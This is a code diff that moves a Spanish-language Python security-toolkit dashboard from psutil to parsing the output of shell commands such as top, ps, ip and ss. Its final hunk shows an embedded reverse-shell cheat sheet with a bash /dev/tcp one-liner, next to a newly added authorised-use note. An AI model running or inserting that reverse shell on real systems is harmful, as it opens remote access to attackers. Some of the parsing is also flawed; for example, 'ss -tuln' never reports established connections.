@@ -13,7 +13,6 @@ import time
 import platform
 import os
 import socket
-import psutil
 from datetime import datetime
 
 try:
@@ -547,24 +546,83 @@ class VistaDashboard(tk.Frame):
     def _actualizar_metricas_sistema(self):
         """Actualizar métricas del sistema."""
         try:
-            # CPU Usage
-            cpu_percent = psutil.cpu_percent(interval=1)
+            # CPU Usage con comando nativo top
+            try:
+                result = subprocess.run(['top', '-bn1'], capture_output=True, text=True, timeout=5)
+                for line in result.stdout.split('\n'):
+                    if 'Cpu(s):' in line or '%Cpu' in line:
+                        # Extraer porcentaje usado
+                        parts = line.split()
+                        for i, part in enumerate(parts):
+                            if 'us' in part and i > 0:
+                                cpu_percent = float(parts[i-1].replace('%', ''))
+                                break
+                        else:
+                            cpu_percent = 0.0
+                        break
+                else:
+                    cpu_percent = 0.0
+            except (subprocess.SubprocessError, ValueError):
+                cpu_percent = 0.0
+            
             self.cpu_label.configure(text=f"{cpu_percent:.1f}%")
             
-            # Memory Usage
-            memoria = psutil.virtual_memory()
-            self.memoria_label.configure(text=f"{memoria.percent:.1f}%")
+            # Memory Usage con comando free
+            try:
+                result = subprocess.run(['free'], capture_output=True, text=True, timeout=5)
+                lines = result.stdout.split('\n')
+                for line in lines:
+                    if 'Mem:' in line:
+                        parts = line.split()
+                        total = int(parts[1])
+                        used = int(parts[2])
+                        memoria_percent = (used / total) * 100
+                        break
+                else:
+                    memoria_percent = 0.0
+            except (subprocess.SubprocessError, ValueError, IndexError):
+                memoria_percent = 0.0
+                
+            self.memoria_label.configure(text=f"{memoria_percent:.1f}%")
             
-            # Procesos activos
-            procesos = len(psutil.pids())
+            # Procesos activos con ps
+            try:
+                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
+                procesos = len(result.stdout.split('\n')) - 2  # Restar header y línea vacía
+            except subprocess.SubprocessError:
+                procesos = 0
+                
             self.procesos_label.configure(text=str(procesos))
             
-            # Uptime del sistema
-            boot_time = psutil.boot_time()
-            uptime_seconds = time.time() - boot_time
-            uptime_hours = int(uptime_seconds // 3600)
-            uptime_minutes = int((uptime_seconds % 3600) // 60)
-            self.uptime_label.configure(text=f"{uptime_hours}h {uptime_minutes}m")
+            # Uptime del sistema con uptime
+            try:
+                result = subprocess.run(['uptime'], capture_output=True, text=True, timeout=5)
+                uptime_str = result.stdout.strip()
+                # Extraer tiempo de funcionamiento
+                if 'day' in uptime_str:
+                    days = uptime_str.split('day')[0].split()[-1]
+                    time_part = uptime_str.split(',')[1].strip()
+                else:
+                    days = "0"
+                    time_part = uptime_str.split('up')[1].split(',')[0].strip()
+                
+                # Formatear para mostrar horas y minutos
+                if ':' in time_part:
+                    hours, minutes = time_part.split(':')
+                    hours = hours.strip()
+                    minutes = minutes.strip()
+                else:
+                    hours = "0"
+                    minutes = "0"
+                    
+                uptime_display = f"{hours}h {minutes}m"
+                if days != "0":
+                    uptime_display = f"{days}d {uptime_display}"
+                    
+            except (subprocess.SubprocessError, IndexError):
+                uptime_display = "0h 0m"
+                
+            self.uptime_label.configure(text=uptime_display)
             
         except Exception as e:
             print(f"Error actualizando métricas del sistema: {e}")
@@ -619,24 +677,52 @@ class VistaDashboard(tk.Frame):
         try:
             self.interfaces_text.delete(1.0, tk.END)
             
-            interfaces = psutil.net_if_addrs()
-            stats = psutil.net_if_stats()
-            
-            for interface, direcciones in interfaces.items():
-                if interface in stats and stats[interface].isup:
-                    self.interfaces_text.insert(tk.END, f" {interface}:\n")
+            # Usar comando ip addr para obtener interfaces
+            try:
+                result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
+                lines = result.stdout.split('\n')
+                
+                current_interface = None
+                for line in lines:
+                    line = line.strip()
                     
-                    for direccion in direcciones:
-                        if direccion.family == socket.AF_INET:  # IPv4
-                            self.interfaces_text.insert(tk.END, f"   IPv4: {direccion.address}\n")
-                        elif direccion.family == socket.AF_INET6:  # IPv6
-                            self.interfaces_text.insert(tk.END, f"   IPv6: {direccion.address}\n")
+                    # Línea de interface (ej: "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>")
+                    if ': ' in line and '<' in line and '>' in line:
+                        parts = line.split(': ')
+                        if len(parts) >= 2:
+                            current_interface = parts[1].split(':')[0]
+                            flags = line.split('<')[1].split('>')[0]
+                            estado = "🟢 UP" if "UP" in flags else "⚫ DOWN"
+                            self.interfaces_text.insert(tk.END, f"▶ {current_interface}:\n")
+                            self.interfaces_text.insert(tk.END, f"   Estado: {estado}\n")
                     
-                    # Estado de la interface
-                    stat = stats[interface]
-                    estado = "🟢 UP" if stat.isup else " DOWN"
-                    velocidad = f"{stat.speed} Mbps" if stat.speed > 0 else "Unknown"
-                    self.interfaces_text.insert(tk.END, f"   Estado: {estado} | Velocidad: {velocidad}\n\n")
+                    # Líneas de direcciones IP
+                    elif current_interface and 'inet ' in line:
+                        ip_info = line.split('inet ')[1].split()[0]
+                        self.interfaces_text.insert(tk.END, f"   IPv4: {ip_info}\n")
+                    
+                    elif current_interface and 'inet6 ' in line and 'scope global' in line:
+                        ip_info = line.split('inet6 ')[1].split()[0]
+                        self.interfaces_text.insert(tk.END, f"   IPv6: {ip_info}\n")
+                        
+                # Agregar información de velocidad con ethtool si está disponible
+                try:
+                    result_ethtool = subprocess.run(['ethtool', 'eth0'], capture_output=True, text=True, timeout=3)
+                    for line in result_ethtool.stdout.split('\n'):
+                        if 'Speed:' in line:
+                            speed = line.split('Speed:')[1].strip()
+                            self.interfaces_text.insert(tk.END, f"   Velocidad: {speed}\n")
+                            break
+                except:
+                    pass  # ethtool no disponible o falló
+                            
+            except subprocess.SubprocessError:
+                # Fallback usando ifconfig si ip no está disponible
+                try:
+                    result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
+                    self.interfaces_text.insert(tk.END, result.stdout[:1000])  # Truncar si es muy largo
+                except subprocess.SubprocessError:
+                    self.interfaces_text.insert(tk.END, "Error: comandos de red no disponibles")
             
         except Exception as e:
             self.interfaces_text.delete(1.0, tk.END)
@@ -645,14 +731,39 @@ class VistaDashboard(tk.Frame):
     def _actualizar_estadisticas_red(self):
         """Actualizar estadísticas de red."""
         try:
-            # Conexiones activas
-            conexiones = psutil.net_connections()
-            conexiones_establecidas = len([c for c in conexiones if c.status == 'ESTABLISHED'])
-            self.conexiones_label.configure(text=str(conexiones_establecidas))
-            
-            # Puertos en escucha
-            puertos_escucha = len([c for c in conexiones if c.status == 'LISTEN'])
-            self.puertos_label.configure(text=str(puertos_escucha))
+            # Conexiones activas usando ss command
+            try:
+                # Contar conexiones establecidas
+                result = subprocess.run(['ss', '-tuln'], capture_output=True, text=True, timeout=5)
+                lines = result.stdout.split('\n')
+                
+                conexiones_establecidas = 0
+                puertos_escucha = 0
+                
+                for line in lines:
+                    if 'ESTAB' in line or 'ESTABLISHED' in line:
+                        conexiones_establecidas += 1
+                    elif 'LISTEN' in line:
+                        puertos_escucha += 1
+                
+                self.conexiones_label.configure(text=str(conexiones_establecidas))
+                self.puertos_label.configure(text=str(puertos_escucha))
+                
+            except subprocess.SubprocessError:
+                # Fallback usando netstat si ss no está disponible
+                try:
+                    result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True, timeout=5)
+                    lines = result.stdout.split('\n')
+                    
+                    conexiones_establecidas = len([l for l in lines if 'ESTABLISHED' in l])
+                    puertos_escucha = len([l for l in lines if 'LISTEN' in l])
+                    
+                    self.conexiones_label.configure(text=str(conexiones_establecidas))
+                    self.puertos_label.configure(text=str(puertos_escucha))
+                    
+                except subprocess.SubprocessError:
+                    self.conexiones_label.configure(text="N/A")
+                    self.puertos_label.configure(text="N/A")
             
         except Exception as e:
             print(f"Error actualizando estadísticas de red: {e}")
@@ -1053,6 +1164,7 @@ ssh2john id_rsa > hash.txt               # SSH key
             
             "Reverse Shells": """
 # REVERSE SHELLS CHEATSHEET
+# NOTA DE SEGURIDAD: Solo para uso en auditorías autorizadas
 
 ## Bash
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
